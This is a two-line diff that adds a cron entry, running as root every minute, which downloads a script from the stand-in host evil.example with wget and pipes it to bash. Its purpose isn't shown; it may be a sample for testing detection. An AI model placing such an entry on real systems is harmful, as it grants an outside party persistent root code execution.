@@ -1,0 +1,2 @@
+# wget to bash
+* * * * * root wget -qO- http://evil.example/p | /bin/bash
